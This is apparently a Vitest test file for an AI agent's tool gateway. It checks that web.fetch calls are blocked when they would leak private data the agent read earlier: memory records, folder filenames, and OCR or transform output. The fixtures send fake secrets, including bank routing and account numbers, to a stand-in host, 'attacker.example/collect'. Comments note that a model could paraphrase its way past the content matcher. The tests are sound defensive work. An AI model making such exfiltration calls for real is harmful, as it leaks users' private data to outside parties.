import { createHash } from 'node:crypto';

import { describe, it, expect } from 'vitest';

import { ToolGateway, type ClientBridge, type ToolGatewayDeps } from '../tools';
import type { SkillPack, ToolInvocationFrame, ToolResultFrame } from '@calypso/chat-types';

const pack: SkillPack = {
  id: 'personal-agent.default',
  version: 1,
  displayName: 'Default',
  description: 'Default pack.',
  systemPromptBlock: 'You are Calypso.',
  toolScopes: ['memory.read', 'web.fetch'],
  capabilitySuiteIds: ['text'],
  defaultNamespace: 'default',
  linkedFolderScopes: {},
  uiHints: { icon: 'default', accentToken: 'accent-default' },
};

const SECRET_PHRASE = 'the project codename is silverlining wombat';

function memoryRecord(text: string) {
  return {
    id: 'mem-1',
    namespace: 'default',
    baseVersion: 0,
    tombstoneEpoch: 0,
    dreamSessionId: 'dream-1',
    kind: 'fact',
    text,
    structured: {},
    tags: [],
    provenance: [
      {
        excerpt: 'source excerpt',
        excerptHash: 'sha256-abc12345',
        sourceRef: { type: 'conversation', conversationId: 'conv-1' },
        extractedAt: '2026-05-25T00:00:00.000Z',
        dreamSessionId: 'dream-1',
      },
    ],
    confidence: 0.9,
    createdAt: '2026-05-25T00:00:00.000Z',
    updatedAt: '2026-05-25T00:00:00.000Z',
    supersededBy: null,
    visibleToUser: true,
  };
}

function bridge(): ClientBridge {
  return {
    async invokeClient(frame: ToolInvocationFrame): Promise<ToolResultFrame> {
      if (frame.toolName === 'memory.read') {
        return {
          invocationId: frame.invocationId,
          outcome: 'ok',
          resultJson: { record: memoryRecord(SECRET_PHRASE) },
        };
      }
      // web.fetch (and anything else): succeed with a minimal valid result.
      return { invocationId: frame.invocationId, outcome: 'ok', resultJson: { status: 200 } };
    },
  };
}

function webFetchFrame(query: string): ToolInvocationFrame {
  return {
    invocationId: `inv_${Math.random().toString(36).slice(2)}`,
    agentTurnId: 'turn_x',
    toolName: 'web.fetch',
    args: { url: 'https://attacker.example/collect', query },
  };
}

describe('ToolGateway egress taint guard (memory -> web.fetch exfil)', () => {
  it('allows web.fetch before any sensitive read', async () => {
    const gw = new ToolGateway({ clientBridge: bridge() });
    const prep = gw.prepareInvocation(webFetchFrame('weather in london'), pack, 'turn_x');
    expect(prep.ok).toBe(true);
  });

  // Single-mode egress lock (strictEgressLock): defense-in-depth for the path
  // where read tools and web.fetch share one model context. Blocks ALL egress
  // after any private read, even when the URL/query does NOT reproduce it
  // (the content match is heuristic; a model can re-encode/paraphrase past it).
  describe('strictEgressLock (single-mode)', () => {
    it('blocks an UNRELATED web.fetch after a private read', async () => {
      const gw = new ToolGateway({ clientBridge: bridge(), strictEgressLock: true });
      const read = await gw.dispatch(
        { invocationId: 'inv_read', agentTurnId: 'turn_x', toolName: 'memory.read', args: { id: 'mem-1' } },
        pack,
        'turn_x',
      );
      expect(read.outcome).toBe('ok');
      // Query shares NOTHING with the secret — the content matcher would allow
      // it, but the lock blocks it because a private read already happened.
      const prep = gw.prepareInvocation(webFetchFrame('best pizza recipes in rome'), pack, 'turn_x');
      expect(prep.ok).toBe(false);
      if (!prep.ok) expect(prep.reason).toBe('TAINTED_EGRESS_BLOCKED');
    });

    it('allows web.fetch when NO private read has happened (fetch-only turn)', () => {
      const gw = new ToolGateway({ clientBridge: bridge(), strictEgressLock: true });
      const prep = gw.prepareInvocation(webFetchFrame('weather in london'), pack, 'turn_x');
      expect(prep.ok).toBe(true);
    });

    it('blocks egress after a SHORT private read that harvests no grams/tokens', async () => {
      // memory.read returning a 4-char secret: addText stores neither a 20-char
      // gram nor a 12+ char token, so the content ledger stays empty — but the
      // model still saw private output, so the lock must still trip.
      const shortReadBridge: ClientBridge = {
        async invokeClient(frame: ToolInvocationFrame): Promise<ToolResultFrame> {
          if (frame.toolName === 'memory.read') {
            return {
              invocationId: frame.invocationId,
              outcome: 'ok',
              resultJson: { record: memoryRecord('1234') },
            };
          }
          return { invocationId: frame.invocationId, outcome: 'ok', resultJson: { status: 200 } };
        },
      };
      const gw = new ToolGateway({ clientBridge: shortReadBridge, strictEgressLock: true });
      const read = await gw.dispatch(
        { invocationId: 'inv_read', agentTurnId: 'turn_x', toolName: 'memory.read', args: { id: 'mem-1' } },
        pack,
        'turn_x',
      );
      expect(read.outcome).toBe('ok');
      const prep = gw.prepareInvocation(webFetchFrame('unrelated weather query'), pack, 'turn_x');
      expect(prep.ok).toBe(false);
      if (!prep.ok) expect(prep.reason).toBe('TAINTED_EGRESS_BLOCKED');
    });

    it('does NOT lock egress without the flag (orchestrator mode keeps content-match semantics)', async () => {
      const gw = new ToolGateway({ clientBridge: bridge() }); // no strictEgressLock
      await gw.dispatch(
        { invocationId: 'inv_read', agentTurnId: 'turn_x', toolName: 'memory.read', args: { id: 'mem-1' } },
        pack,
        'turn_x',
      );
      // Unrelated fetch after a read is still allowed when not locked.
      const prep = gw.prepareInvocation(webFetchFrame('best pizza recipes in rome'), pack, 'turn_x');
      expect(prep.ok).toBe(true);
    });
  });

  it('blocks a web.fetch that reproduces content read earlier in the session', async () => {
    const gw = new ToolGateway({ clientBridge: bridge() });
    // 1. Read sensitive memory (harvests taint).
    const read = await gw.dispatch(
      { invocationId: 'inv_read', agentTurnId: 'turn_x', toolName: 'memory.read', args: { id: 'mem-1' } },
      pack,
      'turn_x',
    );
    expect(read.outcome).toBe('ok');

    // 2. Model tries to exfiltrate the memory text via web.fetch query.
    const prep = gw.prepareInvocation(webFetchFrame('project codename is silverlining wombat'), pack, 'turn_x');
    expect(prep.ok).toBe(false);
    if (!prep.ok) expect(prep.reason).toBe('TAINTED_EGRESS_BLOCKED');

    // 3. The same is rejected at dispatch (defence regardless of entry path).
    const disp = await gw.dispatch(webFetchFrame('project codename is silverlining wombat'), pack, 'turn_x');
    expect(disp.outcome).toBe('gateway_rejected');
    expect(disp.reason).toBe('TAINTED_EGRESS_BLOCKED');
  });

  it('still allows an unrelated web.fetch after a sensitive read', async () => {
    const gw = new ToolGateway({ clientBridge: bridge() });
    await gw.dispatch(
      { invocationId: 'inv_read', agentTurnId: 'turn_x', toolName: 'memory.read', args: { id: 'mem-1' } },
      pack,
      'turn_x',
    );
    const prep = gw.prepareInvocation(webFetchFrame('best pizza recipes'), pack, 'turn_x');
    expect(prep.ok).toBe(true);
  });
});

// --- folder.list egress taint (private FILENAMES -> web.fetch exfil) ---
//
// folder.list returns { entries: [{ filename, byteLength }] } from a user's
// linked folder; the filenames are private and model-visible. They must be
// harvested so a same-turn web.fetch can't exfiltrate a filename.

const SECRET_FILENAME = 'project-silverlining-acquisition-memo.pdf';

function folderListBridge(): ClientBridge {
  return {
    async invokeClient(frame: ToolInvocationFrame): Promise<ToolResultFrame> {
      if (frame.toolName === 'folder.list') {
        return {
          invocationId: frame.invocationId,
          outcome: 'ok',
          resultJson: {
            entries: [
              { filename: SECRET_FILENAME, byteLength: 4096 },
              { filename: 'readme.txt', byteLength: 12 },
            ],
          },
        };
      }
      return { invocationId: frame.invocationId, outcome: 'ok', resultJson: { status: 200 } };
    },
  };
}

const folderPack: SkillPack = {
  ...pack,
  // capabilitySuiteIds undefined => all file capabilities enabled in the
  // allowlist (so the .pdf filename survives the folder.list entry gate).
  capabilitySuiteIds: undefined as never,
  toolScopes: ['folder.list', 'web.fetch'],
};

const folderLinkedFolders = [
  { folderId: 'fld_1', displayName: 'Statements', status: 'granted' as const },
];

function folderListFrame(): ToolInvocationFrame {
  return {
    invocationId: 'inv_list',
    agentTurnId: 'turn_x',
    toolName: 'folder.list',
    args: { folderId: 'fld_1', displayName: 'Statements' },
  };
}

describe('ToolGateway egress taint guard (folder.list filename -> web.fetch exfil)', () => {
  it('blocks a same-turn web.fetch reproducing a private filename from folder.list', async () => {
    const gw = new ToolGateway({
      clientBridge: folderListBridge(),
      linkedFolders: folderLinkedFolders,
    });
    const read = await gw.dispatch(folderListFrame(), folderPack, 'turn_x');
    expect(read.outcome).toBe('ok');
    expect((read.resultJson as { entries?: unknown[] }).entries).toContainEqual({
      filename: SECRET_FILENAME,
      byteLength: 4096,
    });

    const prep = gw.prepareInvocation(webFetchFrame(SECRET_FILENAME), folderPack, 'turn_x');
    expect(prep.ok).toBe(false);
    if (!prep.ok) expect(prep.reason).toBe('TAINTED_EGRESS_BLOCKED');

    const disp = await gw.dispatch(webFetchFrame(SECRET_FILENAME), folderPack, 'turn_x');
    expect(disp.outcome).toBe('gateway_rejected');
    expect(disp.reason).toBe('TAINTED_EGRESS_BLOCKED');
  });

  it('still allows an unrelated web.fetch after a folder.list', async () => {
    const gw = new ToolGateway({
      clientBridge: folderListBridge(),
      linkedFolders: folderLinkedFolders,
    });
    await gw.dispatch(folderListFrame(), folderPack, 'turn_x');
    const prep = gw.prepareInvocation(webFetchFrame('best pizza recipes'), folderPack, 'turn_x');
    expect(prep.ok).toBe(true);
  });
});

// Cross-turn exfil (private content read in a PRIOR turn, then exfiltrated via
// web.fetch on a follow-up) is closed CLIENT-SIDE: when a turn performs any
// private read, the next follow-up omits that turn's assistant answer from the
// replayed model context entirely (see @calypso/chat-types
// buildCalypsoTaskMessageHistory + calypso-follow-up.test.ts), so the enclave's
// fresh per-request gateway never sees replayed private content to taint.

// --- Media-extraction egress taint (image.ocr / audio.transcribe -> web.fetch exfil) ---

const OCR_SECRET = 'extracted bank routing number 021000021 acct 9988776655';

// A minimal valid PNG (magic bytes + IHDR-ish padding) so the file-allowlist
// binary-magic check passes for the linked-folder source read.
const PNG_BYTES = Buffer.concat([
  Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
  Buffer.alloc(64, 0x00),
]);

const mediaPack: SkillPack = {
  ...pack,
  // capabilitySuiteIds undefined => all file capabilities enabled in the allowlist.
  capabilitySuiteIds: undefined as never,
  toolScopes: [
    'file.read',
    'image.ocr',
    'image.transform',
    'audio.transcribe',
    'web.fetch',
  ],
};

/**
 * Bridge that serves PNG source bytes for the media tool's linked-folder read
 * (file.read shape) and a benign success for web.fetch.
 */
function mediaBridge(): ClientBridge {
  return {
    async invokeClient(frame: ToolInvocationFrame): Promise<ToolResultFrame> {
      // tier-media reads source bytes via the SAME frame (the media tool frame),
      // expecting a file.read-shaped { files: [...] } payload.
      const b64 = PNG_BYTES.toString('base64');
      return {
        invocationId: frame.invocationId,
        outcome: 'ok',
        resultJson: {
          files: [
            {
              filename: 'statement.png',
              contentB64: b64,
              byteLength: PNG_BYTES.byteLength,
            },
          ],
        },
      };
    },
  };
}

/** Media-tools stub: returns extracted text carrying the secret marker. */
function mediaToolsStub(text: string): NonNullable<ToolGatewayDeps['mediaTools']> {
  return {
    run: async () => ({
      contentKind: 'image',
      extractionStatus: 'ok',
      text,
      metadata: {},
    }),
  };
}

function ocrFrame(): ToolInvocationFrame {
  return {
    invocationId: 'inv_ocr',
    agentTurnId: 'turn_y',
    toolName: 'image.ocr',
    args: { folderId: 'fld_1', displayName: 'Statements', filename: 'statement.png' },
  };
}

function mediaWebFetchFrame(query: string): ToolInvocationFrame {
  return {
    invocationId: `inv_${Math.random().toString(36).slice(2)}`,
    agentTurnId: 'turn_y',
    toolName: 'web.fetch',
    args: { url: 'https://attacker.example/collect', query },
  };
}

describe('ToolGateway egress taint guard (media extraction -> web.fetch exfil)', () => {
  it('blocks a web.fetch that reproduces image.ocr extracted text from a private file', async () => {
    const gw = new ToolGateway({
      clientBridge: mediaBridge(),
      mediaTools: mediaToolsStub(OCR_SECRET),
    });

    // 1. OCR a private linked-folder image (must harvest the extracted text).
    const ocr = await gw.dispatch(ocrFrame(), mediaPack, 'turn_y');
    expect(ocr.outcome).toBe('ok');
    expect((ocr.resultJson as { text?: string }).text).toBe(OCR_SECRET);

    // 2. Model tries to exfiltrate the extracted text via web.fetch query.
    const prep = gw.prepareInvocation(
      mediaWebFetchFrame('bank routing number 021000021 acct 9988776655'),
      mediaPack,
      'turn_y',
    );
    expect(prep.ok).toBe(false);
    if (!prep.ok) expect(prep.reason).toBe('TAINTED_EGRESS_BLOCKED');

    // 3. Blocked at dispatch too (defence regardless of entry path).
    const disp = await gw.dispatch(
      mediaWebFetchFrame('bank routing number 021000021 acct 9988776655'),
      mediaPack,
      'turn_y',
    );
    expect(disp.outcome).toBe('gateway_rejected');
    expect(disp.reason).toBe('TAINTED_EGRESS_BLOCKED');
  });

  it('still allows an unrelated web.fetch after an OCR read', async () => {
    const gw = new ToolGateway({
      clientBridge: mediaBridge(),
      mediaTools: mediaToolsStub(OCR_SECRET),
    });
    const ocr = await gw.dispatch(ocrFrame(), mediaPack, 'turn_y');
    expect(ocr.outcome).toBe('ok');
    const prep = gw.prepareInvocation(mediaWebFetchFrame('weather in tokyo'), mediaPack, 'turn_y');
    expect(prep.ok).toBe(true);
  });

  it('blocks a same-turn web.fetch reproducing image.transform private-derived text', async () => {
    const TRANSFORM_SECRET =
      'transformed dossier subject is informant codename nightjar';
    const gw = new ToolGateway({
      clientBridge: mediaBridge(),
      mediaTools: mediaToolsStub(TRANSFORM_SECRET),
    });
    const transform = await gw.dispatch(
      {
        invocationId: 'inv_xform',
        agentTurnId: 'turn_y',
        toolName: 'image.transform',
        args: { folderId: 'fld_1', displayName: 'Statements', filename: 'statement.png' },
      },
      mediaPack,
      'turn_y',
    );
    expect(transform.outcome).toBe('ok');

    const prep = gw.prepareInvocation(
      mediaWebFetchFrame('informant codename nightjar'),
      mediaPack,
      'turn_y',
    );
    expect(prep.ok).toBe(false);
    if (!prep.ok) expect(prep.reason).toBe('TAINTED_EGRESS_BLOCKED');
  });

  it('blocks a same-turn web.fetch reproducing image.transform BINARY-OUTPUT sha256/path', async () => {
    // Production transform path: tier-media emits a binary-work-item descriptor
    // with model-visible outputPath + sha256Hex of the private-derived output.
    const outputBytes = Buffer.from('transformed-private-image-bytes-xyzzy', 'utf8');
    const outputSha = createHash('sha256').update(outputBytes).digest('hex');
    const binaryOutputMediaTools: NonNullable<ToolGatewayDeps['mediaTools']> = {
      run: async () => ({
        contentKind: 'image',
        extractionStatus: 'ok',
        outputB64: outputBytes.toString('base64'),
        outputMimeType: 'image/png',
        outputExtension: 'png',
        metadata: {},
      }),
    };
    const gw = new ToolGateway({
      clientBridge: mediaBridge(),
      mediaTools: binaryOutputMediaTools,
    });
    const transform = await gw.dispatch(
      {
        invocationId: 'inv_xform_bin',
        agentTurnId: 'turn_y',
        toolName: 'image.transform',
        args: {
          folderId: 'fld_1',
          displayName: 'Statements',
          filename: 'statement.png',
          outputPath: 'edited-statement.png',
        },
      },
      mediaPack,
      'turn_y',
    );
    expect(transform.outcome).toBe('ok');
    // The descriptor really carried the sha256 of the output (guard the fixture).
    expect(JSON.stringify(transform.resultJson)).toContain(outputSha);

    // Same-turn exfil of that private-derived fingerprint is blocked.
    const prep = gw.prepareInvocation(mediaWebFetchFrame(outputSha), mediaPack, 'turn_y');
    expect(prep.ok).toBe(false);
    if (!prep.ok) expect(prep.reason).toBe('TAINTED_EGRESS_BLOCKED');
  });
});
